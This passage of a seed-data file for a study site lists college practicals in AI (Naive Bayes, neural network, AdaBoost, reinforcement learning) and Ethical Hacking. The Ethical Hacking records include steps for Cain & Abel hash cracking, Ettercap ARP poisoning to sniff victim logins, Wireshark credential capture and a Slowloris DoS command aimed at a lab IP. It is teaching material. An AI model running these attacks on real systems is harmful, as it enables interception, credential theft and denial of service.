    PTypeFrench = tot('Type', 'F') / total_exp
    PTypeItalian = tot('Type', 'I') / total_exp
    PTypeBurger = tot('Type', 'B') / total_exp
    PTypeThai = tot('Type', 'T') / total_exp
    PEstFew = tot('Est', '0-10') / total_exp
    PEstMore = tot('Est', '10-30') / total_exp
    PEstStillMore = tot('Est', '30-60') / total_exp
    PEstTooMuch = tot('Est', '>60') / total_exp
    PAnsYes = tot('ans', 'Y') / total_exp
    PAnsNo = tot('ans', 'N') / total_exp

    print('Probability for will wait if there is an Alternate Restaurant Nearby: ')
    print('Yes: Will Wait ', (getProbab('Alt', 'Y', 'Y') * PAnsYes / PAltYes) * 100, '%')
    print('No: Will Wait ', (getProbab('Alt', 'Y', 'N') * PAnsNo / PAltYes) * 100, '%')

    print('Probability for will wait if there No is an Alternate Restaurant Nearby: ')
    print('Yes: Will Wait ', (getProbab('Alt', 'N', 'Y') * PAnsYes / PAltNo) * 100, '%')
    print('No: Will Wait ', (getProbab('Alt', 'N', 'N') * PAnsNo / PAltNo) * 100, '%')

    print('Probability for will wait if Estimated Wait time is 0-10 minutes: ')
    print('Yes: Will Wait ', (getProbab('Est', '0-10', 'Y') * PAnsYes / PEstFew) * 100, '%')
    print('No: Will Wait ', (getProbab('Est', '0-10', 'N') * PAnsNo / PEstFew) * 100, '%')

    print('Probability for will wait if Estimated Wait time is 10-30 minutes ')
    print('Yes: Will Wait ', (getProbab('Est', '10-30', 'Y') * PAnsYes / PEstMore) * 100, '%')
    print('No: Will Wait ', (getProbab('Est', '10-30', 'N') * PAnsNo / PEstMore) * 100, '%')

    print("Probability for Will Wait if the Estimated Wait Time is 30-60 mins: ")
    print("Yes: Will Wait: ", (getProbab('Est', '30-60', 'Y') * PAnsYes / PEstStillMore) * 100, "%")
    print("No: Will Wait: ", (getProbab('Est', '30-60', 'N') * PAnsNo / PEstStillMore) * 100, "%")

    print("Probability for Will Wait if the Estimated Wait Time is >60 mins: ")
    print("Yes: Will Wait: ", (getProbab('Est', '>60', 'Y') * PAnsYes / PEstTooMuch) * 100, "%")
    print("No: Will Wait: ", (getProbab('Est', '>60', 'N') * PAnsNo / PEstTooMuch) * 100, "%")

    print('Probability for will wait if there are Some Patrons ')
    print('Yes: Will Wait ', (getProbab('Pat', 'S', 'Y') * PAnsYes / PPatSome) * 100, '%')
    print('No: Will Wait ', (getProbab('Pat', 'S', 'N') * PAnsNo / PPatSome) * 100, '%')

    print("Probability for Will Wait if there are None Patrons: ")
    print("Yes: Will Wait: ", (getProbab('Pat', 'N', 'Y') * PAnsYes / PPatNone) * 100, "%")
    print("No: Will Wait: ", (getProbab('Pat', 'N', 'N') * PAnsNo / PPatNone) * 100, "%")

    print("Probability for Will Wait if there are Full Patrons: ")
    print("Yes: Will Wait: ", (getProbab('Pat', 'F', 'Y') * PAnsYes / PPatFull) * 100, "%")
    print("No: Will Wait: ", (getProbab('Pat', 'F', 'N') * PAnsNo / PPatFull) * 100, "%")

    print('Probability for will wait if the place is Thai ')
    print('Yes: Will Wait ', (getProbab('Type', 'T', 'Y') * PAnsYes / PTypeThai) * 100, '%')
    print('No: Will Wait ', (getProbab('Type', 'T', 'N') * PAnsNo / PTypeThai) * 100, '%')

main()

# ---------------------------------------------------------
${RWP_PY_CODE}`,
    original_code: `from RWP import
rwp_examples total_exp = 12
def tot(attribute,
value): count = 0
for key, val in
rwp_examples.items(): for
key1, val1 in val.items():
if key1 == attribute:
if val1 == value:
count += 1
return count
def getProbab(attribute, attribval,
value): count = 0
for key, val in
rwp_examples.items(): val1 =
rwp_examples[key][attribute]
val2 =
rwp_examples[key]['ans']
if val1 == attribval and val2 == value:
count += 1
probab = count / tot('ans',
value) return probab
# (Followed by prior and posterior probability calculations in main() on pages 20-22)`,
    expected_output: `Probability for will wait if there is an Alternate Restaurant Nearby: 
Yes: Will Wait  50.0 %
No: Will Wait  50.0 %
Probability for will wait if there No is an Alternate Restaurant Nearby: 
Yes: Will Wait  50.0 %
No: Will Wait  50.0 %
Probability for will wait if Estimated Wait time is 0-10 minutes: 
Yes: Will Wait  71.42857142857143 %
No: Will Wait  28.57142857142857 %
Probability for will wait if Estimated Wait time is 10-30 minutes 
Yes: Will Wait  50.0 %
No: Will Wait  50.0 %
Probability for Will Wait if the Estimated Wait Time is 30-60 mins: 
Yes: Will Wait:  0.0 %
No: Will Wait:  100.0 %
Probability for Will Wait if the Estimated Wait Time is >60 mins: 
Yes: Will Wait:  0.0 %
No: Will Wait:  100.0 %
Probability for will wait if there are Some Patrons 
Yes: Will Wait  100.0 %
No: Will Wait  0.0 %
Probability for Will Wait if there are None Patrons: 
Yes: Will Wait:  0.0 %
No: Will Wait:  100.0 %
Probability for Will Wait if there are Full Patrons: 
Yes: Will Wait:  33.33333333333333 %
No: Will Wait:  66.66666666666666 %
Probability for will wait if the place is Thai 
Yes: Will Wait  50.0 %
No: Will Wait  50.0 %`,
    algorithm_steps: [
      'Import the 12 training examples (x1 to x12) from RWP.py.',
      'Define tot(attribute, value) to count occurrences of an attribute-value pair across the 12 examples.',
      'Define getProbab(attribute, attribval, value) to compute conditional likelihood P(attribute = attribval | ans = value).',
      'Compute prior probabilities for all attribute values and target classes PAnsYes and PAnsNo.',
      'Apply Bayes theorem P(ans | X) = (P(X | ans) * P(ans)) / P(X) * 100 to calculate posterior waiting probabilities.'
    ],
    procedure_steps: [],
    instructions: 'Requires RWP.py in the same directory. Note: In RWP.py on page 3, x10 has Est="10- 30" with a space in the PDF; normalized to "10-30" in RWP.py so PEstMore matches both x4 and x10 and produces the exact 50.0% / 50.0% output shown on page 22.',
    keywords: ['naive bayes', 'rwp', 'restaurant waiting problem', 'rwp.py', 'probability', 'bayes theorem', 'patrons', 'wait time'],
    aliases: ['AI Practical 6', 'Naive Bayes RWP Python', 'Restaurant Waiting Problem Naive Bayes'],
    source_pdf: 'final_AI__3f2816a9.pdf',
    source_pages: [1, 3, 20, 21, 22],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220107',
    source_key: 'ai-prac-07',
    subject_id: '11111111-1111-4111-8111-111111111101',
    subject_name: 'Artificial Intelligence',
    subject_slug: 'artificial-intelligence',
    practical_number: 7,
    title: 'Feed Forward Backpropagation Neural Network Learning Algorithm',
    original_question: 'Implement feed forward back propagation neural network learning algorithm.',
    programming_language: 'Python',
    corrected_code: `import numpy as np

class NeuralNetwork():
    def __init__(self):
        # Seeding for random number generation
        np.random.seed(1)
        # Converting weights to a 3 by 1 matrix with values from -1 to 1
        self.synaptic_weights = 2 * np.random.random((3, 1)) - 1

    def sigmoid(self, x):
        # Applying the sigmoid function
        return 1 / (1 + np.exp(-x))

    def sigmoid_derivative(self, x):
        # Computing derivative to the sigmoid function
        return x * (1 - x)

    def train(self, training_inputs, training_outputs, training_iterations):
        # Training the model to make accurate predictions while adjusting weights
        for iteration in range(training_iterations):
            # Siphon the training data via the neuron
            output = self.think(training_inputs)
            # Compute error rate for back-propagation
            error = training_outputs - output
            # Performing weight adjustments
            adjustments = np.dot(training_inputs.T, error * self.sigmoid_derivative(output))
            self.synaptic_weights += adjustments

    def think(self, inputs):
        # Passing the inputs via the neuron to get output
        # Converting values to floats
        inputs = inputs.astype(float)
        output = self.sigmoid(np.dot(inputs, self.synaptic_weights))
        return output

if __name__ == "__main__":
    # Initializing the neuron class
    neural_network = NeuralNetwork()

    print("Beginning randomly generated weights: ")
    print(neural_network.synaptic_weights)

    # Training data consisting of 4 examples -- 3 inputs & 1 output
    training_inputs = np.array([[0, 0, 1], [1, 1, 1], [1, 0, 1], [0, 1, 1]])
    training_outputs = np.array([[0, 1, 1, 0]]).T

    # Training taking place
    neural_network.train(training_inputs, training_outputs, 15000)

    print("Ending weights after training: ")
    print(neural_network.synaptic_weights)

    user_input_one = str(input("User Input One: "))
    user_input_two = str(input("User Input Two: "))
    user_input_three = str(input("User Input Three: "))

    print("Considering new situation: ", user_input_one, user_input_two, user_input_three)
    print("New output data: ")
    print(neural_network.think(np.array([user_input_one, user_input_two, user_input_three])))`,
    original_code: `import numpy as np
class
NeuralNetwork()
: def _init_
(self):
#seeding for random number
generation np.random.seed()
#converting weights to a 3 by 1 matrix
self.synaptic_weights=2*np.random.random
((3,1))-1
#x is output
variable def
sigmoid(self, x):
#applying the sigmoid
function return
1/(1+np.exp(-x))
def sigmoid_derivative(self,x):
#computing derivative to the sigmoid
function return x*(1-x)
def train(self,training_inputs,training_outputs,training_iterations):
#training the model to make accurate predictions while
adjusting for iteration in range(training_iterations):
#siphon the training data via the neuron
output=self.think(training_inputs)
error=training_outputs-output
#performing weight adjustments
adjustments=np.dot(training_inputs.T,error*self.sigmoid_derivative(output))
self.synaptic_weights+=adjustments
def think(self,inputs):
#passing the inputs via the neuron to get
output #converting values to floats
inputs=inputs.astype(float)
output=self.sigmoid(np.dot(inputs,self.synaptic_weigh
ts))
return output
if _name_ =="_main_":
#initializing the neuron class
neural_network=NeuralNetwork()
...`,
    expected_output: `Beginning randomly generated weights: 
[[ 0.67813245]
 [ 0.90926853]
 [-0.4150907 ]]
Ending weights after training: 
[[10.08758208]
 [-0.206867  ]
 [-4.83771668]]
User Input One: 2
User Input Two: 4
User Input Three: 6
Considering new situation:  2 4 6
New output data: 
[6.26049311e-05]`,
    algorithm_steps: [
      'Initialize a NeuralNetwork class with a 3x1 synaptic_weights matrix randomly initialized in [-1, 1].',
      'Define the sigmoid activation function 1 / (1 + exp(-x)) and its derivative x * (1 - x).',
      'For each of the 15,000 training iterations, perform forward propagation output = sigmoid(dot(inputs, weights)).',
      'Compute error = training_outputs - output and weight adjustments = dot(inputs.T, error * sigmoid_derivative(output)).',
      'Update synaptic_weights += adjustments, then evaluate the trained network on new user inputs.'
    ],
    procedure_steps: [],
    instructions: 'Requires numpy (pip install numpy). Fixed single-underscore typos from PDF (`def _init_` -> `def __init__`, `if _name_ == "_main_":` -> `if __name__ == "__main__":`) and split line `15 000` -> `15000`.',
    keywords: ['neural network', 'feed forward', 'back propagation', 'backpropagation', 'sigmoid', 'synaptic_weights', 'numpy'],
    aliases: ['AI Practical 7', 'Feed Forward Backpropagation Neural Network Python'],
    source_pdf: 'final_AI__3f2816a9.pdf',
    source_pages: [1, 23, 24],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220108',
    source_key: 'ai-prac-08',
    subject_id: '11111111-1111-4111-8111-111111111101',
    subject_name: 'Artificial Intelligence',
    subject_slug: 'artificial-intelligence',
    practical_number: 8,
    title: 'AdaBoost (Adaptive Boosting) Learning Algorithm',
    original_question: 'Implement AdaBoost (Adaptive Boosting) learning algorithm',
    programming_language: 'Python',
    corrected_code: `import pandas
from sklearn import model_selection
from sklearn.ensemble import AdaBoostClassifier

url = "https://raw.githubusercontent.com/jbrownlee/Datasets/master/pima-indians-diabetes.data.csv"
names = ['preg', 'plas', 'pres', 'skin', 'test', 'mass', 'pedi', 'age', 'class']
dataframe = pandas.read_csv(url, names=names)
array = dataframe.values
X = array[:, 0:8]
Y = array[:, 8]
seed = 7
num_trees = 30

model = AdaBoostClassifier(n_estimators=num_trees, random_state=seed)
results = model_selection.cross_val_score(model, X, Y)
print(results.mean())`,
    original_code: `import pandas
fromsklearn import model_selection
from sklearn.ensemble import AdaBoostClassifier
url = "https://raw.githubusercontent.com/jbrownlee/Datasets/master/pima-indians-
diabetes.data.csv" names = ['preg', 'plas', 'pres', 'skin', 'test', 'mass', 'pedi', 'age',
'class']
dataframe = pandas.read_csv(url,
names=names) array = dataframe.values
X = array[:,0:8]
Y = array[:,8]
seed = 7
num_trees = 30
model = AdaBoostClassifier(n_estimators=num_trees, random_state=seed)
results =
model_selection.cross_val_score(model, X, Y)
print(results.mean())`,
    expected_output: `0.7617774382480265`,
    algorithm_steps: [
      'Load the Pima Indians Diabetes dataset CSV from the URL using pandas.read_csv with column names.',
      'Extract feature matrix X = array[:, 0:8] and target vector Y = array[:, 8].',
      'Set random seed = 7 and num_trees = 30.',
      'Instantiate AdaBoostClassifier(n_estimators=num_trees, random_state=seed).',
      'Evaluate the model using model_selection.cross_val_score(model, X, Y) and print results.mean().'
    ],
    procedure_steps: [],
    instructions: 'Requires pandas and scikit-learn (pip install pandas scikit-learn) and internet access to fetch the Pima Indians Diabetes CSV (or a local copy of pima-indians-diabetes.data.csv).',
    keywords: ['adaboost', 'adaptive boosting', 'adaboostclassifier', 'ensemble learning', 'pima indians diabetes', 'cross_val_score', 'sklearn'],
    aliases: ['AI Practical 8', 'AdaBoost Classifier Python'],
    source_pdf: 'final_AI__3f2816a9.pdf',
    source_pages: [1, 25],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220109',
    source_key: 'ai-prac-09',
    subject_id: '11111111-1111-4111-8111-111111111101',
    subject_name: 'Artificial Intelligence',
    subject_slug: 'artificial-intelligence',
    practical_number: 9,
    title: 'Reinforcement Learning Algorithm (State Utility Calculation)',
    original_question: 'Implement Reinforcement Learning algorithm.',
    programming_language: 'Python',
    corrected_code: `import numpy as np

def return_state_utility(v, T, u, reward, gamma):
    action_array = np.zeros(4)
    for action in range(0, 4):
        action_array[action] = np.sum(np.multiply(u, np.dot(v, T[:, :, action])))
    return reward + gamma * np.max(action_array)

def main():
    v = np.array([[0.0, 0.0, 0.0, 0.0,
                   0.0, 0.0, 0.0, 0.0,
                   1.0, 0.0, 0.0, 0.0]])
    # Load T.npy (12x12x4 transition matrix from pages 26-28)
    T = np.load("T.npy")
    u = np.array([[0.812, 0.868, 0.918, 1.0, 0.762, 0.0, 0.660, -1.0,
                   0.705, 0.655, 0.611, 0.388]])
    reward = -0.4
    gamma = 1.0
    utility_11 = return_state_utility(v, T, u, reward, gamma)
    print("Utility of state (1,1): " + str(utility_11))

main()`,
    original_code: `import numpy as np
def return_state_utility(v, T, u, reward, gamma):
action_array = np.zeros(4)
for action in range(0, 4):
action_array[action] = np.sum(np.multiply(u, np.dot(v, T[:,:,action]))) return reward + gamma *
np.max(action_array)
def main():
v = np.array([[0.0, 0.0, 0.0, 0.0,
0.0, 0.0, 0.0, 0.0,
1.0, 0.0, 0.0, 0.0]])
T= np.load("T.npy")
u = np.array([[0.812, 0.868, 0.918, 1.0, 0.762, 0.0, 0.660, -1.0,
0.705, 0.655, 0.611, 0.388]])
reward = -0.4
gamma
1.0
utility_11 = return_state_utility(v, T, u, reward, gamma)
print("Utility of state (1,1): " + str(utility_11))main()`,
    expected_output: `Utility of state (1,1): 0.3456`,
    algorithm_steps: [
      'Define return_state_utility(v, T, u, reward, gamma) implementing the Bellman equation for a 4x3 grid world (12 states, 4 actions).',
      'For each action in range(0, 4), compute expected utility sum(multiply(u, dot(v, T[:, :, action]))).',
      'Return reward + gamma * max(action_array).',
      'In main(), initialize state vector v (with 1.0 at index 8 corresponding to state (1,1)), transition matrix T from T.npy, utility vector u, reward = -0.4, and discount factor gamma = 1.0.',
      'Compute and print the utility of state (1,1).'
    ],
    procedure_steps: [],
    instructions: 'Requires numpy and T.npy (12x12x4 transition probability array printed on pages 26–28 of the PDF). Fixed missing assignment operator in `gamma = 1.0` and newline before `main()` on page 28.',
    keywords: ['reinforcement learning', 'bellman equation', 'state utility', 'return_state_utility', 't.npy', 'markov decision process', 'mdp', '0.3456'],
    aliases: ['AI Practical 9', 'Reinforcement Learning State Utility Python'],
    source_pdf: 'final_AI__3f2816a9.pdf',
    source_pages: [1, 26, 27, 28],
    verification_status: 'verified_corrected',
    review_required: false
  },

  // ============================================================================
  // SUBJECT 2: ETHICAL HACKING (10 Practicals)
  // ============================================================================
  {
    id: '22222222-2222-4222-8222-222222220201',
    source_key: 'eh-prac-01',
    subject_id: '11111111-1111-4111-8111-111111111102',
    subject_name: 'Ethical Hacking',
    subject_slug: 'ethical-hacking',
    practical_number: 1,
    title: 'Google and WHOIS Reconnaissance',
    original_question: 'GOOGLE AND WHO – IS RECONNAISSANCE',
    programming_language: 'CLI / Web Tool',
    corrected_code: null,
    original_code: null,
    expected_output: 'Displays comprehensive domain registration, registrar, DNS records, Ping results, and Traceroute information about www.youtube.com.',
    algorithm_steps: [],
    procedure_steps: [
      'Step 1: Open the WHO.is website (https://who.is).',
      'Step 2: Enter the target website domain name (e.g., www.youtube.com) in the lookup search bar and press the "Enter" / Search button.',
      'Step 3: Inspect the output tabs (Whois, DNS, Diagnostics) showing domain registrar details, nameservers, Ping statistics, and Traceroute hops for www.youtube.com.'
    ],
    instructions: 'Passive reconnaissance practical using https://who.is domain lookup.',
    keywords: ['whois', 'who.is', 'google reconnaissance', 'footprinting', 'domain lookup', 'youtube.com', 'dns', 'ping', 'traceroute'],
    aliases: ['EH Practical 1', 'Google and Whois Reconnaissance'],
    source_pdf: 'final_ethical_hacking_607197eb.pdf',
    source_pages: [1, 2],
    verification_status: 'verified_original',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220202',
    source_key: 'eh-prac-02',
    subject_id: '11111111-1111-4111-8111-111111111102',
    subject_name: 'Ethical Hacking',
    subject_slug: 'ethical-hacking',
    practical_number: 2,
    title: 'Password Encryption and Cracking with CrypTool and Cain & Abel',
    original_question: 'PASSWORD ENCRYPTION AND CRACKING WITH CRYPTOOL AND CAIN AND ABLE',
    programming_language: 'Security Tools (CrypTool & Cain and Abel)',
    corrected_code: null,
    original_code: null,
    expected_output: 'Part 1: Plaintext encrypted into hexadecimal ciphertext and decrypted back using 24-bit RC4 key (00 00 00) in CrypTool.\nPart 2: MD5 hash (5F4DCC3B5AA765D61D8327DEB882CF99) cracked via Dictionary Attack using Wordlist.txt in Cain & Abel to reveal plaintext "password".',
    algorithm_steps: [],
    procedure_steps: [
      '--- Part 1: Use CrypTool to Encrypt & Decrypt Password Using RC4 Algorithm ---',
      'Step 1: Open Chrome and download/install CrypTool from http://www.cryptool.org/en/ct1downloads.',
      'Step 2: Open the CrypTool application.',
      'Step 3: Click File -> New and type the plaintext message in the editor window.',
      'Step 4: Click Encrypt/Decrypt -> Symmetric (modern) -> RC4...',
      'Step 5: Select the key length (24 bits), enter hexadecimal key (00 00 00), and click Encrypt.',
      'Step 6: Observe the encrypted hexadecimal view.',
      'Step 7: To decrypt, click Encrypt/Decrypt -> Symmetric (modern) -> RC4...',
      'Step 8: Select the same key length (24 bits) and key (00 00 00), then click Decrypt.',
      'Step 9: Verify that the original plaintext message is restored.',
      '--- Part 2: Password Cracking Using Cain & Abel Dictionary Attack ---',
      'Step 1: Search for Cain & Abel (v4.9.56) in Chrome and download the installer.',
      'Step 2: Open and run the Cain & Abel installer.',
      'Step 3: Download WinPcap 4.1.3 from Chrome.',
      'Step 4: Install WinPcap 4.1.3.',
      'Step 5: Open the Cain & Abel application.',
      'Step 6: Click on the "Cracker" tab, then open the "Hash Calculator" tool from the toolbar.',
      'Step 7: Enter a sample password (e.g., "password") in the "Text to hash" field, click "Calculate", and copy the generated MD5 hash value.',
      'Step 8: In the Cracker tab -> MD5 Hashes list, add the hash, right-click the hash entry, and select "Dictionary Attack".',
      'Step 9: Right-click the dictionary list pane, select "Add to list", choose C:\\Program Files (x86)\\Cain\\Wordlists\\Wordlist.txt, and click "Start" to crack the password.'
    ],
    instructions: 'Requires CrypTool 1.x and Cain & Abel v4.9.56 with WinPcap 4.1.3 in a Windows lab environment.',
    keywords: ['cryptool', 'cain and abel', 'cain and able', 'rc4', 'password encryption', 'password cracking', 'dictionary attack', 'md5 hash', 'winpcap', 'wordlist.txt'],
    aliases: ['EH Practical 2', 'Password Encryption and Decryption with CrypTool', 'Cain and Abel Dictionary Attack'],
    source_pdf: 'final_ethical_hacking_607197eb.pdf',
    source_pages: [1, 3, 4, 5, 6, 7],
    verification_status: 'verified_original',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220203',
    source_key: 'eh-prac-03',
    subject_id: '11111111-1111-4111-8111-111111111102',
    subject_name: 'Ethical Hacking',
    subject_slug: 'ethical-hacking',
    practical_number: 3,
    title: 'Linux Network Analysis and ARP Poisoning',
    original_question: 'LINUX NETWORK ANALYSIS AND ARP POISONING',
    programming_language: 'Bash / Kali Linux CLI',
    corrected_code: `# Part 1: Linux Network Analysis Commands
ifconfig
ping 192.168.152.128
netstat
traceroute 192.168.247.136

# Part 2: ARP Poisoning with Ettercap
ifconfig
ettercap-graphical`,
    original_code: `ifconfig
ping 192.168.152.128
neststat
tracroute 192.168.152.128
ettercap-graphical`,
    expected_output: 'Part 1: Displays eth0/lo interface details (inet 192.168.152.128), ICMP echo replies, active UNIX/socket connections, and hop-by-hop route trace.\nPart 2: Ettercap scans active hosts on the subnet (192.168.152.1, 192.168.152.2, 192.168.152.254) and starts MITM ARP poisoning in promiscuous mode.',
    algorithm_steps: [],
    procedure_steps: [
      '--- Part 1: Linux Network Analysis ---',
      'Step 1: Open the Kali Linux virtual machine and launch the terminal.',
      'Step 2: Run `ifconfig` in the terminal to inspect network interfaces and find the machine IP address (e.g., 192.168.152.128).',
      'Step 3: Run `ping 192.168.152.128` to test network connectivity and packet round-trip time.',
      'Step 4: Run `netstat` (spelled "neststat" in PDF text) to view active network sockets and connections.',
      'Step 5: Run `traceroute 192.168.247.136` (spelled "tracroute 192.168.152.128" in PDF text) to trace the hops packets take to reach the target host.',
      '--- Part 2: ARP Poisoning with Ettercap ---',
      'Step 1: Open the Kali Linux terminal and run `ifconfig` to confirm the interface IP address.',
      'Step 2: Run `ettercap-graphical` to launch the graphical interface of Ettercap.',
      'Step 3: Click the "Hosts" menu (top bar) and select "Scan for hosts" to scan the local network.',
      'Step 4: Click "Hosts" -> "Hosts list" to view discovered live hosts and the default gateway.',
      'Step 5: Add the router/gateway IP (e.g., 192.168.152.1 / 192.168.152.2) to Target 1 and the victim IP (e.g., 192.168.152.254) to Target 2.',
      'Step 6: Click the MITM menu (earth icon) -> "ARP Poisoning...", check "Sniff remote connections", and click OK.',
      'Step 7: Click Start -> "Start sniffing" to place the network card into promiscuous mode and begin ARP poisoning.',
      'Step 8: Observe intercepted traffic and victim login activity in the Ettercap output logs.'
    ],
    instructions: 'Note: The PDF text on pages 8-9 contains minor command typos ("neststat" instead of "netstat" and "tracroute" instead of "traceroute"); the corrected commands are provided in the code block.',
    keywords: ['ifconfig', 'ping', 'netstat', 'traceroute', 'arp poisoning', 'ettercap', 'ettercap-graphical', 'mitm', 'man in the middle', 'kali linux'],
    aliases: ['EH Practical 3', 'Linux Network Analysis and ARP Poisoning'],
    source_pdf: 'final_ethical_hacking_607197eb.pdf',
    source_pages: [1, 8, 9, 10],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220204',
    source_key: 'eh-prac-04',
    subject_id: '11111111-1111-4111-8111-111111111102',
    subject_name: 'Ethical Hacking',
    subject_slug: 'ethical-hacking',
    practical_number: 4,
    title: 'Port Scanning with Nmap (ACK, SYN, FIN, NULL, and XMAS Scans)',
    original_question: 'PORT SCANNING WITH NMAP\n1. USE NMAP TO PERFORM AN ACK SCAN TO DETERMINE IF A PORT IS FILTERED ,UNFILTERED ,OR OPEN .\n2. PERFORM SYN, FIN, NULL, AND XMAS SCANS TO IDENTIFY OPEN PORT AND THEIR CHARACTERITICS.',
    programming_language: 'Bash / Nmap CLI',
    corrected_code: `# 1. ACK Scan (-sA) with T4 timing template
nmap -sA -T4 scanme.nmap.org

# 2. SYN / Port Scan on specific ports (22, 113, 139)
nmap -p 22,113,139 scanme.nmap.org

# 3. FIN Scan (-sF) sets just the TCP FIN bit
nmap -sF -T4 scanme.nmap.org

# 4. NULL Scan (-sN) does not set any TCP flags (flag header is 0)
nmap -sN -p 22 scanme.nmap.org

# 5. XMAS Scan (-sX) sets the FIN, PSH, and URG flags
nmap -sX -T4 scanme.nmap.org`,
    original_code: `nmap -sA –T4 scanme.nmap.org
nmap –p22, 113, 139 scanme.nmap.org
nmap –sF-T4 para
nmap -sN –p 22 scanme.nmap.org
nmap –sN -p 22 scanme.nmap.org`,
    expected_output: `Starting Nmap 7.991 ( https://nmap.org )
Nmap scan report for scanme.nmap.org (45.33.32.156)
Host is up (0.28s latency).
PORT   STATE          SERVICE
22/tcp open|filtered  ssh
Nmap done: 1 IP address (1 host up) scanned`,
    algorithm_steps: [],
    procedure_steps: [
      'Step 1 (ACK Scan): Run `nmap -sA -T4 scanme.nmap.org` in Zenmap/Nmap to perform a TCP ACK scan and determine whether ports are filtered or unfiltered.',
      'Step 2 (SYN / Specific Port Scan): Run `nmap -p 22,113,139 scanme.nmap.org` (or `nmap -sS -p 22,113,139 scanme.nmap.org`) to check open ports such as 22/tcp (ssh).',
      'Step 3 (FIN Scan): Run `nmap -sF -T4 scanme.nmap.org` to send packets with only the TCP FIN bit set.',
      'Step 4 (NULL Scan): Run `nmap -sN -p 22 scanme.nmap.org` to send TCP packets with no flags set (header is 0).',
      'Step 5 (XMAS Scan): Run `nmap -sX -T4 scanme.nmap.org` to send TCP packets with FIN, PSH, and URG flags set.'
    ],
    instructions: 'Note: In the source PDF (pages 11-12), en-dashes (–) were used instead of standard hyphens (-), Step 2 had spaces inside "-p22, 113, 139" causing Nmap to treat 113 and 139 as hostnames, and Step 5 body text repeated "-sN" while the Zenmap screenshot showed `nmap -sX -T4 scanme.nmap.org`. The corrected commands above fix all flags.',
    keywords: ['nmap', 'zenmap', 'port scanning', 'ack scan', 'syn scan', 'fin scan', 'null scan', 'xmas scan', 'scanme.nmap.org', '-sa', '-ss', '-sf', '-sn', '-sx'],
    aliases: ['EH Practical 4', 'Port Scanning with Nmap'],
    source_pdf: 'final_ethical_hacking_607197eb.pdf',
    source_pages: [1, 11, 12],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220205',
    source_key: 'eh-prac-05',
    subject_id: '11111111-1111-4111-8111-111111111102',
    subject_name: 'Ethical Hacking',
    subject_slug: 'ethical-hacking',
    practical_number: 5,
    title: 'Network Traffic Capture with Wireshark and Slowloris DoS Attack',
    original_question: 'NETWORK TRAFFIC CAPTURE AND DOS ATTACK WITH WIRESHARK AND NEMESY',
    programming_language: 'Bash / Kali Linux CLI',
    corrected_code: `# Part 1: Launch Wireshark in Kali Linux
wireshark

# Part 2: Denial of Service (DoS) Attack using Slowloris
mkdir Slowloris
cd Slowloris
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
ifconfig
sudo service apache2 start
sudo service apache2 status
ls -l
python3 slowloris.py 192.168.152.128 -s 500`,
    original_code: `wireshark
mkdir Slowloris
cd slowloris
git.clone https://github.com/gkbrk/slowloris.git
ifconfig
service apache 2 status
ls –l
python3 slowloris.py 192.168.152.128 -s 500`,
    expected_output: 'Part 1: Wireshark captures live packets on eth0, filters HTTP traffic, and reveals plaintext credentials in Follow TCP Stream.\nPart 2: Slowloris opens 500 sockets against the target Apache server (192.168.152.128), causing the browser tab for http://192.168.152.128 to hang indefinitely.',
    algorithm_steps: [],
    procedure_steps: [
      '--- Part 1: Network Traffic Capture with Wireshark ---',
      'Step 1: Open the Kali Linux terminal, type `wireshark`, and press Enter.',
      'Step 2: Observe the Wireshark interface list.',
      'Step 3: Select the `eth0` network interface and click the blue shark-fin icon in the top-left toolbar to start capturing.',
      'Step 4: Wireshark begins capturing live network packets.',
      'Step 5: Open an HTTP website and submit a login form in the browser.',
      'Step 6: In Wireshark, type `http` in the display filter bar and press Enter.',
      'Step 7 (numbered Step 8 in PDF): Right-click the HTTP POST packet -> Follow -> TCP Stream, then search for "password" or "user" in the stream search box and click "Find Next".',
      '--- Part 2: Denial of Service (DoS) Attack with Slowloris ---',
      'Step 1: Open the Kali Linux terminal.',
      'Step 2: Create a directory using `mkdir Slowloris`.',
      'Step 3: Navigate into the directory using `cd Slowloris`.',
      'Step 4: Clone the Slowloris repository using `git clone https://github.com/gkbrk/slowloris.git` and enter the cloned directory.',
      'Step 5 & 6: Run `ifconfig` to check the target/local machine IP address (e.g., 192.168.152.128).',
      'Step 7: Start and verify the Apache server using `sudo service apache2 start` and `sudo service apache2 status`.',
      'Step 8: List files using `ls -l`.',
      'Step 9: Launch the Slowloris DoS attack with 500 sockets: `python3 slowloris.py 192.168.152.128 -s 500`.',
      'Step 10: Open the browser and navigate to `http://192.168.152.128` to observe the page continuously loading without opening.'
    ],
    instructions: 'Fixed PDF command typos (`git.clone` -> `git clone`, `service apache 2 status` -> `sudo service apache2 status`, `ls –l` -> `ls -l`). Note: Although the Index title mentions Nemesy, Part 2 in the PDF body uses Slowloris.',
    keywords: ['wireshark', 'dos attack', 'denial of service', 'slowloris', 'nemesy', 'packet capture', 'tcp stream', 'eth0', 'apache2'],
    aliases: ['EH Practical 5', 'Wireshark Traffic Capture and DoS Attack'],
    source_pdf: 'final_ethical_hacking_607197eb.pdf',
    source_pages: [1, 13, 14, 15, 16],
    verification_status: 'verified_corrected',
    review_required: false
  },
  {
    id: '22222222-2222-4222-8222-222222220206',
    source_key: 'eh-prac-06',
    subject_id: '11111111-1111-4111-8111-111111111102',
    subject_name: 'Ethical Hacking',
    subject_slug: 'ethical-hacking',
    practical_number: 6,
    title: 'Persistent Cross-Site Scripting (Stored XSS) Attack on DVWA',
    original_question: 'PERSISTENT CROSS-SITE SCRIPTING ATTACK',
    programming_language: 'Bash / Web Security (DVWA)',
    corrected_code: `# Clone DVWA and set up XAMPP in Kali Linux
sudo git clone https://github.com/digininja/DVWA.git
cd ~/Downloads
ls
chmod 777 xampp-linux-x64-8.1.25-0-installer.run
sudo ./xampp-linux-x64-8.1.25-0-installer.run
sudo mv DVWA /opt/lampp/htdocs/dvwa
cd /opt/lampp
sudo ./lampp start`,
    original_code: `sudo git clone https://github.com/digininja/DVWA.git
Downloads
ls
chmod 777* xampp-linux-x64-8.1.25-0-installer.run
